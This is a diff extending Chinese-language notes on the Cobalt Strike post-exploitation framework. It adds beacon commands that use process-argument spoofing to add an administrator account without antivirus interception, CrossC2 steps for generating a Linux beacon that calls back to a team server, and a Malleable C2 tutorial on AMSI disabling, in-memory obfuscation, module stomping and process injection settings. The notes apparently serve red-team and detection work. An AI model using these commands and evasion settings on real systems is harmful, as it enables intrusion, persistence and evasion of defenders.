@@ -28,6 +28,8 @@ Cobalt Strike 是一款常用于后渗透的神器，这个工具以团队作为
 - [教你修改cobalt strike的50050端口 - 3HACK](https://www.3hack.com/note/96.html)
 - [ryanohoro/csbruter: Cobalt Strike team server password brute force tool](https://github.com/ryanohoro/csbruter)
 - [踩坑记录-DNS Beacon](https://xz.aliyun.com/t/7938)
+- [CS通过CDN上线](https://0x20h.com/p/8dee.html)
+- [渗透利器 Cobalt Strike 在野利用情况专题分析](https://paper.seebug.org/1190/)
 
 **工具/插件**
 
@@ -38,6 +40,11 @@ Cobalt Strike 可以使用 AggressorScripts 脚本来加强自身，能够扩展
 - [DeEpinGh0st/Erebus](https://github.com/DeEpinGh0st/Erebus) CobaltStrike 后渗透测试插件
 - [QAX-A-Team/EventLogMaster](https://github.com/QAX-A-Team/EventLogMaster) - RDP 日志取证 & 清除插件
 - [outflanknl/Spray-AD](https://github.com/outflanknl/Spray-AD) - Cobalt Strike工具，用于审核 AD 用户帐户中的弱密码
+- [gloxec/CrossC2](https://github.com/gloxec/CrossC2)
+
+**C2 Profile**
+- [rsmudge/Malleable-C2-Profiles](https://github.com/rsmudge/Malleable-C2-Profiles)
+- [threatexpress/malleable-c2](https://github.com/threatexpress/malleable-c2)
 
 **爆破 cobaltstrike teamserver**
 ```bash
@@ -757,6 +764,27 @@ Cobalt Strike 附带了一些绕过 UAC 的攻击。但如果当前用户不是�
 steal_token <PID>
 ```
 
+### argue
+
+**绕过杀软添加用户**
+
+argue 进程参数欺骗后可使用 run 或 execute 来执行 net1 命令添加一个管理员用户，全程无拦截，而用 shell 执行 net1 命令时仍然会被拦截，因为它还是通过创建一个 cmd.exe 子进程来执行的。
+```
+argue 进程参数欺骗
+argue [command] [fake arguments]
+argue 命令 假参数 欺骗某个命令参数
+argue [command]
+argue 命令 取消欺骗某个命令参数
+
+beacon> argue net1 /bypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypass
+beacon> run net1 user what t1!@#1dsdfq3 /add
+beacon> run net1 localgroup administrators what /add
+```
+
+![](../../../assets/img/Security/安全工具/CobaltStrike/59.png)
+
+![](../../../assets/img/Security/安全工具/CobaltStrike/60.png)
+
 ---
 
 ## Explore
@@ -1018,22 +1046,398 @@ Cobalt Strike 可通过它的 Aggressor Script 语言来为其编写脚本。Agg
 
 ![](../../../assets/img/Security/安全工具/CobaltStrike/12.png)
 
----
+## CrossC2
 
-# 通信扩展
+地址 : https://github.com/gloxec/CrossC2
 
-Cobalt Strike 可以引用其他的通讯框架 ExternalC2，ExternalC2 是由 Cobalt Strike 提出的一套规范/框架，它允许黑客根据需要对框架提供的默认 HTTP(S)/DNS/SMB C2 通信通道进行扩展。
+下载 CrossC2.cna ,和相应平台的二进制文件,先修改 CrossC2.cna
 
-**修改通讯特征**
+![](../../../assets/img/Security/安全工具/CobaltStrike/54.png)
 
-Cobalt Strike 通信配置文件是 Malleable C2 你可以修改 CS 的通讯特征，Beacon payload 的一些行为
+改为指定的文件路径
+
+选择 Script Manager，添加 CrossC2.cna
+
+起个 https 的监听器
+
+![](../../../assets/img/Security/安全工具/CobaltStrike/55.png)
+
+将服务端的 .cobaltstrike.beacon_keys 文件拷到二进制文件目录下
+
+![](../../../assets/img/Security/安全工具/CobaltStrike/56.png)
+
+生成
+
+![](../../../assets/img/Security/安全工具/CobaltStrike/57.png)
+
+也可以用命令
+```
+genCrossC2.Win.exe 192.168.141.151 443 ./.cobaltstrike.beacon_keys null Linux x64 test
+```
+
+上传 test 文件至目标,加权限运行,目标上线
+
+![](../../../assets/img/Security/安全工具/CobaltStrike/58.png)
+
+参考文章
+- https://0x20h.com/p/c02f.html
+- https://www.cnblogs.com/micr067/p/13311206.html
 
 ---
 
 # CS样本
 
-目录中会一个CobaltStrike.jar文件，直接解压，这里面有一个名为resources的文件夹，就是CobaltStrike的配置信息，我们在CobaltStrike控制台生成的木马都来源于这个文件夹。
+目录中有一个 CobaltStrike.jar 文件，直接解压，这里面有一个名为 resources 的文件夹，就是 CobaltStrike 的配置信息，我们在 CobaltStrike 控制台生成的木马都来源于这个文件夹。
 
 ![](../../../assets/img/Security/安全工具/CobaltStrike/53.png)
 
 可以直接分析这里面的样本，提取规则进行查杀。
+
+---
+
+# 通信扩展
+
+Cobalt Strike 可以引用其他的通讯框架 ExternalC2，ExternalC2 是由 Cobalt Strike 提出的一套规范 / 框架，它允许黑客根据需要对框架提供的默认 HTTP(S)/DNS/SMB C2 通信通道进行扩展。
+
+**Malleable C2**
+
+Beacon 中的 http 通讯由 Malleable-C2 配置文件定义，在启动 teamserver 时来指定我们的配置文件, 每个 CS 只能载入一个配置文件, 多个文件需要启动多个 teamserver
+
+目录下的 c2lint 文件可以检测配置文件的语法问题和测试
+```bash
+chmod +x c2lint
+./c2lint [/path/to/my.profile]
+```
+
+## profile 语法
+
+**简单举例**
+```
+#
+# Backoff POS Malware
+#
+# This profile takes steps to dress up the POST side of Beacon's C2 to
+# look like Backoff. The GET side is left generic.
+#
+```
+
+注释符号 `#`
+
+```
+set sample_name "Backoff POS Malware";
+
+set sleeptime "30000"; # use a ~30s delay between callbacks
+set jitter    "10";    # throw in a 10% jitter
+
+```
+选择赋值 `set` 用来设置一些程序的默认值 语句以; 结束,类似JavaScript.
+
+代码中 `set sleeptime "30000";` 即为设置心跳时间为30000毫秒，`set jitter "10";` 为默认抖动系数（0-99%）
+
+```
+set useragent "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0";
+```
+
+设置 user-agent
+
+**Data Transform Language**
+
+```
+http-get {
+    set uri "/updates";
+
+    client {
+        metadata {
+            netbiosu;
+            prepend "user=";
+            header "Cookie";
+        }
+    }
+
+    server {
+        header "Content-Type" "text/plain";
+
+        output {
+            base64;
+            print;
+        }
+    }
+}
+```
+
+数据转换,CS内置的几种编码
+
+Statement | Action |  Inverse
+-|-|-
+append "string"	 | Append "string"	| Remove last LEN("string") characters
+base64	| Base64 Encode	| Base64 Decode
+base64url	| URL-safe Base64 Encode |	URL-safe Base64 Decode
+mask	| XOR mask w/ random key	| XOR mask w/ same random key
+netbios	| NetBIOS Encode 'a'	| NetBIOS Decode 'a'
+netbiosu	| NetBIOS Encode 'A'	| NetBIOS Decode 'A'
+prepend "string" |	Prepend "string" |	Remove first LEN("string") characters
+
+数据转换语句可以任意数量顺序组合,以终止语句结束,在转换中只能使用一个终止语句
+
+Statement | What
+-|-|
+header "header" |Store data in an HTTP header
+parameter "key" | Store data in a URI parameter
+print   | Send data as transaction body
+uri-append | Append to URI
+
+终止语句将转换后的数据储存到 Http 头中，参数终止语句将转换的数据 print 来最后发送这些编码的数据
+
+print 是 `http-get.server.output`，`http-post.server.output` 和 `http-stager.server.output` 的终止语句配合上文代码可以看出。
+
+其他块使用 `header`，`parameter`，`print` 和 `uri-append` `termination` 语句, 如果在 `http-post.client.output` 上使用 `header` `parameter` `uri append` `termination` 语句，beacon 会将其响应分块到一个合理的长度，以适应事务的一部分。
+
+**Strings**
+
+Beacon 的 Profile 语法可以多个地方使用 Strings
+
+Value | Special Value
+-|-|
+"\n"  |  Newline character
+"\r"   | Carriage Return
+"\t"   | Tab character
+"\u####"  |  A unicode character
+"\x##"  | A byte (e.g., \x41 = 'A')
+"\\"   | \
+
+**Options**
+
+Beacon 的默认值, 分为全局和本地, 全局更改 Beacon 的设置，本地用于特定事务。
+
+Option | Context | Default Value | Changes
+-|-|-|-|
+amsi_disable  | null  |    false  | (Attempt to) disable AMSI for execute-assembly, powerpick, and psinject
+dns_idle    | null |    0.0.0.0 | IP address used to indicate no tasks are available to DNS Beacon; Mask for other DNS C2 values
+dns_max_txt  | null |   252   | Maximum length of DNS TXT responses for tasks
+dns_sleep    | null |   0  | Force a sleep prior to each individual DNS request. (in milliseconds)
+dns_stager_prepend   | null  |   null  |    Prepend text to payload stage delivered to DNS TXT record stager
+dns_stager_subhost   | null |   .stage.123456.    | Subdomain used by DNS TXT record stager.
+dns_ttl  | null |   1    |  TTL for DNS replies
+host_stage   | null    |   true     |  Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.
+jitter     | null  |   0     | Default jitter factor (0-99%)
+maxdns     | null  |   255   | Maximum length of hostname when uploading data over DNS (0-255)
+pipename     | null   |    msagent_##   |  Name of pipe to use for SMB Beacon's peer-to-peer communication. ## is replaced with a number unique to your team server.
+pipename_stager  | null   |    status_##    |  Name of pipe to use for SMB Beacon's named pipe stager. ## is replaced with a number.
+sample_name   | null   |   My Profile   |  The name of this profile (used in the Indicators of Compromise report)
+sleeptime     | null   |   60000     | Default sleep time (in milliseconds)
+spawnto_x86   | null   |   %windir%\syswow64\rundll32.exe   |  Default x86 program to open and inject shellcode into
+spawnto_x64   | null     | %windir%\sysnative\rundll32.exe  |  Default x64 program to open and inject shellcode into
+tcp_port     | null    |   4444     |  TCP Beacon listen port
+uri   | http-get,http-post    |  [required option]  |   Transaction URI
+uri_x86   | http-stager      | null |  x86 payload stage URI
+uri_x64   | http-stager      | null | x64 payload stage URI
+useragent    |null  |     Internet Explorer (Random)   |  Default User-Agent for HTTP comms.
+verb     |  http-get,http-post   | GET,POST     |  HTTP Verb to use for transaction
+
+**Beacon HTTP Transaction**
+
+HTTP请求 参数
+
+Request | Component | Block | Data
+-|-|-|-|
+http-get   |   client  |  metadata   |   Session metadata
+http-get    |  server  |  output  |  Beacon's tasks
+http-post  |   client  |  id  |  Session ID
+http-post   |  client  |  output  |  Beacon's responses
+http-post   |  server   | output  |  Empty
+http-stager  | server |   output  |  Encoded payload stage
+
+**HTTP Staging**
+
+Beacon 是一个分阶段的 payload，有效负载由 stager 下载并注入内存，在目标内存中有 Beacon 之前 HTTP GET 和 HTTP POST 不会生效。 Malleable C2 的 http-stager 块可自定义 HTTP 分段过程。
+
+```
+http-stager {
+      set uri_x86 "/get32.gif";
+      set uri_x64 "/get64.gif";
+```
+
+uri_x86 选项设置 URI 下载 x86 的 payload,uri_x64 选项设置 URI 下载 64 位的 payload 。
+
+**Self-signed Certificates with SSL Beacon**
+
+HTTPS Beacon 在其通信中使用 HTTP Beacon 的指示符, Malleable C2 配置文件还可以指定 Beacon C2 服务器的自签名 SSL 证书的参数。
+
+```
+https-certificate {
+      set CN       "bobsmalware.com";
+      set O        "Bob's Malware";
+}
+```
+
+证书参数
+
+Option | Example | Description
+-|-|-|
+C   |  US   | Country
+CN   | beacon.cobaltstrike.com  | Common Name; Your callback domain
+L   |  Washington   | Locality
+O   |  Strategic Cyber LLC  | Organization Name
+OU   | Certificate Department  |  Organizational Unit Name
+ST  |  DC  |  State or Province
+validity   |   365  | Number of days certificate is valid for
+
+**Valid SSL Certificates with SSL Beacon**
+
+可以选择将有效 SSL 证书与 Beacon 一起使用。使用 Malleable C2 配置文件指定 Java 密钥库文件和密码。此密钥库必须包含证书的私钥，根证书，任何中间证书以及 SSL 证书供应商提供的域证书。
+
+Cobalt Strike 在与 Malleable C2 配置文件相同的文件夹中找到 Java Keystore 文件。
+```
+https-certificate {
+      set keystore "domain.store";
+      set password "mypassword";
+}
+```
+
+Option | Example | Description
+-|-|-|
+Option | Example | Description
+keystore  |  domain.store   | Java Keystore file with certificate information
+password  |  mypassword | The password to your Java Keystore
+
+创建用于 Cobalt Strike 的 Beacon 的有效 SSL 证书的步骤
+
+1. 使用 keytool 程序创建 Java 密钥存储文件。这个程序会询问 “你的姓名是什么？” 确保使用完全权威的域名来响应 Beacon 服务器。另外，请确保记下密钥库密码, 你以后会需要它。
+
+    `$ keytool -genkey -keyalg RSA -keysize 2048 -keystore domain.store`
+
+2. 使用 keytool 生成证书签名请求（CSR）, 您将向您的 SSL 证书供应商提交此文件, 他们将验证您的身份并颁发证书, 有些供应商比其他供应商更容易和便宜。
+
+    `$ keytool -certreq -keyalg RSA -file domain.csr -keystore domain.store`
+
+3. 导入 SSL 供应商提供的 Root 和任何中间证书。
+
+    `$ keytool -import -trustcacerts -alias FILE -file FILE.crt -keystore domain.store`
+
+4. 最后，您必须安装域证书。
+
+    `$ keytool -import -trustcacerts -alias mykey -file domain.crt -keystore domain.store`
+
+就是这样就生成 Cobalt Strike 的 Beacon 一起使用的 Java Keystore 文件。
+
+**Code Signing Certificate**
+
+提供签署可执行文件或 DLL 文件的选项, 需要 代码签名证书和私钥指定 Java Keystore 文件
+```
+code-signer {
+            set keystore "keystore.jks";
+            set password "password";
+            set alias    "server";
+}
+```
+
+Option | Example | Description
+-|-|-|
+alias  | server | The keystore's alias for this certificate
+digest_algorithm  |  SHA256  |The digest algorithm
+keystore   | keystore.jks   | Java Keystore file with certificate information
+password  |  mypassword | The password to your Java Keystore
+timestamp |  false  | Timestamp the file using a third-party service
+timestamp_url |  http://timestamp.digicert.com  | URL of the timestamp service
+
+**PE and Memory Indicators**
+
+Malleable C2 stage http-stager 控制 Beacon 如何加载到内存中并编辑 Beacon DLL 的内容。
+
+```
+stage {
+            set userwx "false";
+            set compile_time "14 Jul 2009 8:14:00";
+            set image_size_x86 "512000";
+            set image_size_x64 "512000";
+            set obfuscate "true";
+
+            transform-x86 {
+                        prepend "\x90\x90";
+                        strrep "ReflectiveLoader" "DoLegitStuff";
+            }
+            transform-x64 {
+                        # transform the x64 rDLL stage
+            }
+
+            stringw "I am not Beacon!";
+}
+```
+
+当接受后将字符串添加到 beacon dll 的. rdata 部分，string 命令添加一个以 zero-terminated 的字符串。stringw 命令添加了一个宽（utf-16le 编码）字符串,Transform-x86 和 Transform-X64 阻止 PAD 和 Transform Beacon 的反射 DLL 阶段。这些块支持三个命令：prepend、append 和 strrep.
+
+prepend 命令在 beacon 的反射 dll 之前插入一个字符串, append 命令在 beacon-reflective dll 后面添加一个字符串, 确保预先准备好的数据是阶段体系架构（x86、x64）的有效代码, c2lint 程序没有对此进行检查, strrep 命令替换 beacon 反射 dll 中的字符串。
+
+stage 块接受 Beacon DLL 内容的选项:
+
+Option | Example | Description
+-|-|-|
+checksum   |  0   | The CheckSum value in Beacon's PE header
+cleanup  |false  |  Ask Beacon to attempt to free memory associated with the Reflective DLL package that initialized it.
+compile_time   |  14 July 2009 8:14:00    | The build time in Beacon's PE header
+entry_point | 92145  |  The EntryPoint value in Beacon's PE header
+image_size_x64  | 512000 |  SizeOfImage value in x64 Beacon's PE header
+image_size_x86  | 512000 |  SizeOfImage value in x86 Beacon's PE header
+module_x64  | xpsservices.dll | Same as module_x86; affects x64 loader
+module_x86  | xpsservices.dll | Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc.
+name   |  beacon.x64.dll   |The Exported name of the Beacon DLL
+obfuscate   | false  |  Obfuscate the Reflective DLL's import table, overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.
+rich_header   | null  | Meta-information inserted by the compiler
+sleep_mask   |false  |  Obfuscate Beacon, in-memory, prior to sleeping
+stomppe  |true   |  Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
+userwx  | false   | Ask ReflectiveLoader to use or avoid RWX permissions for Beacon DLL in memory
+
+**Cloning PE Headers**
+
+Cobalt Strike 的 Linux 软件包, 包括一个工具 peclone，用于从 dll 中提取头文件并将其显示为一个随时可用的阶段块：
+
+`./peclone [/path/to/sample.dll]`
+
+**In-memory Evasion and Obfuscation**
+
+使用 stage 块的 prepend 命令来破坏分析，该分析扫描内存段的前几个字节以查找注入的 dll 的迹象。如果使用特定于工具的字符串检测代理，请使用 strrep 命令更改它们。
+
+如果 strrep 不够，请将 sleep_mask 设置为 true。这将引导信标在进入睡眠状态之前在记忆中模糊自己。在休眠之后，信标会将自己的模糊处理为请求和处理任务。SMB 和 TCP 信标在等待新连接或等待来自其父会话的数据时会使它们自己变得模糊。
+
+决定您希望在内存中看起来有多像一个 DLL。如果您希望方便检测，请将 stomppe 设置为 false。如果您想在内存中稍微混淆信标 dll，请将 stomppe 设置为 true。如果你想挑战，将 “模糊” 设置为“真”。此选项将采取许多步骤来模糊信标阶段和内存中 DLL 的最终状态。
+
+将 userwx 设置为 false 以询问 beacon 的加载器以避免 rwx 权限。具有这些权限的内存段将吸引分析师和安全产品的额外关注。
+
+默认情况下，Beacon 的加载程序使用 virtualloc 分配内存。模块踩踏是一种替代方法。将 module_x86 设置为一个大约是 beacon 有效载荷本身两倍大的 dll。Beacon 的 x86 加载程序将加载指定的 dll，在内存中查找其位置并覆盖它。这是一种在内存中定位信标的方法，Windows 将其与磁盘上的文件关联。您要驻留的应用程序不需要您选择的 DLL，这一点很重要。模块_x64 选项的情况相同，但它会影响 x64 信标。
+
+如果您担心在内存中初始化 beacon dll 的 beacon 阶段，请将 cleanup 设置为 true。此选项将在不再需要信标阶段时释放与之关联的内存。
+
+**Process Injection**
+
+Malleable C2 配置文件中的进程注入块可以注入内容并控制进程注入行为
+
+```
+process-inject {
+            set min_alloc "16384";
+            set startrwx "true";
+            set userwx "false";
+
+            transform-x86 {
+                        prepend "\x90\x90";
+            }
+            transform-x64 {
+                        # transform x64 injected content
+            }
+
+            disable "CreateRemoteThread";
+}
+```
+
+transform-x86 和 transform-x64 阻止 Beacon 注入的 PAD 内容。这些块支持两个命令：prepend 和 append
+
+prepend 命令在插入的内容之前插入一个字符串。append 命令在注入的内容之后添加一个字符串。确保预先准备好的数据是注入内容体系结构（x86、x64）的有效代码。c2lint 程序没有对此进行检查。
+
+disable 语句是避免在 beacon 的进程注入例程中使用某些 API 的提示。您可以禁用：sethreadcontext、createRemoteThread 和 rtlcreateUserThread。请注意，当您禁用这些调用时，可能会在 Beacon 的进程注入例程中引入可避免的失败。c2lint 命令会发出一些警告。
+
+process-inject 块接受几个控制 Beacon 中的过程注入的选项
+
+Option | Example | Description
+-|-|-|
+min_alloc  |   4096    |  Minimum amount of memory to request for injected content
+startrwx   |   true  |    Use RWX as initial permissions for injected content. Alternative is RW.
+userwx  |  false |  Use RWX as final permissions for injected content. Alternative is RX.
